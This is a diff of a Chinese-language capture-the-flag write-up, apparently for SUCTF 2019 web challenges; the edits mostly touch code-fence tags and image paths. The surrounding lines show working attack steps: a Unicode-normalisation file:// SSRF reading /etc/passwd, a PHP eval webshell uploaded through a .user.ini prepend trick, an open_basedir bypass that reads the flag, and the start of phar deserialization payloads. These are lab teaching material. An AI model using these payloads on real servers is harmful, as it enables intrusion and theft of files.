@@ -13,7 +13,7 @@ categories:
 
 - 2019 usa black hat一个议题  [会议pdf](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)
 
-  ![](../pic/67)
+  ![](/pic/67)
 
 - 关于[idna编码](https://datatracker.ietf.org/doc/rfc5891/)   在处理℆时，经过idna编码，再经过utf-8解码就会变成c/u
 
@@ -23,7 +23,7 @@ categories:
 
 题目给了源码
 
-```
+```python
 @app.route('/getUrl', methods=['GET', 'POST'])
 def getUrl():
     url = request.args.get("url")
@@ -108,7 +108,7 @@ file:////suctf.cc/etc/passwd
 
 会返回主机的用户记录
 
-```
+```bash
 root:*:17647:0:99999:7:::
 daemon:*:17647:0:99999:7:::
 bin:*:17647:0:99999:7:::
@@ -137,7 +137,7 @@ nginx:!:17708:0:99999:7:::
 getUrl?url=file:////suctf.cc/etc/nginx/nginx.conf
 ```
 
-![](../pic/66)
+![](/pic/66)
 
 查看网站配置文件
 
@@ -178,7 +178,7 @@ flag{b692ca82-8292-4582-846a-286b3743f697}
 
 **预期解**
 black hat 上的所展示的部分字符
-![](../pic/69.png)
+![](/pic/69.png)
 
 Altman师傅写的脚本
 
@@ -223,7 +223,7 @@ getUrl?url=file:////suctf.c℆usr/fffffflag
 
 先fuzz一遍，以下关键字被过滤
 
-![](../pic/68.png)
+![](/pic/68.png)
 
 **非预期解**
 
@@ -277,7 +277,7 @@ Array ( [0] => 1 ) Array ( [0] => 1flag{36c7b843-6efb-409d-a1fe-3ef54fce7d6d} )
 
 先直接上传图片马，提示文件内容包含`<?`，采用js的写法绕过
 
-```
+```js
 <script language="php"> 
 eval($_POST[cmd]);
 </script>
@@ -287,11 +287,11 @@ eval($_POST[cmd]);
 
 php有一个文件是[.user.ini](https://www.php.net/manual/zh/configuration.file.per-user.php)    [参考连接]([https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html](https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html))
 
-![](../pic/70)
+![](/pic/70)
 
 先上传一个图片马
 
-```
+```http
 Content-Disposition: form-data; name="fileUpload"; filename="1.gif"
 Content-Type: image/gif
 
@@ -315,7 +315,7 @@ auto_prepend_file=1.gif  相当于文件夹下所有文件都包含1.gif
 
 返回信息
 
-```
+```html
 <!DOCTYPE html>
 <html lang="en">
 
@@ -353,7 +353,7 @@ Your dir uploads/2c67ca1eaeadbdc1868d67003072b481 <br>Your files : <br>array(5) 
 
 使用蚁剑连接`host/uploads/2c67ca1eaeadbdc1868d67003072b481/index.php`即可
 
-![](../pic/71.png)
+![](/pic/71.png)
 
 
 
@@ -361,7 +361,7 @@ Your dir uploads/2c67ca1eaeadbdc1868d67003072b481 <br>Your files : <br>array(5) 
 
 打开题目就是源码
 
-```
+```php
 <?php
 function get_the_flag(){
     // webadmin will remove your upload file every 20 min!!!! 
@@ -432,7 +432,7 @@ open_basedir	/var/www/html/:/tmp/
 
 
 
-```
+```php
 function get_the_flag(){
     // webadmin will remove your upload file every 20 min!!!! 
     $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
@@ -510,7 +510,7 @@ cmd=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..'
 
 返回内容
 
-![](../pic/72.png)
+![](/pic/72.png)
 
 找到flag，读取flag
 
@@ -518,7 +518,7 @@ cmd=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..'
 cmd=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file('/THis_Is_tHe_F14g'));
 ```
 
-![](../pic/73.png)
+![](/pic/73.png)
 
 
 
@@ -526,7 +526,7 @@ cmd=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..'
 
 给出了源码
 
-```
+```php
 //admin.php
 <?php
 include 'config.php';
@@ -601,7 +601,7 @@ else {
 
 大致意思就是要构造ssrf进行命令执行。SoapClient可以构造http请求。
 
-```
+```php
 // func.php
 <?php
 include 'class.php';
@@ -618,7 +618,7 @@ if (isset($_POST["submit"]) && isset($_POST["url"])) {
 ?>
 ```
 传入的url要经过正则匹配，调用file类
-```
+```php
 // class.php
 <?php
 include 'config.php';
@@ -682,7 +682,7 @@ php://php://filter/resource=phar://
 
 生成phar文件
 
-```
+```php
 <?php
 class File {
     public $file_name = "";
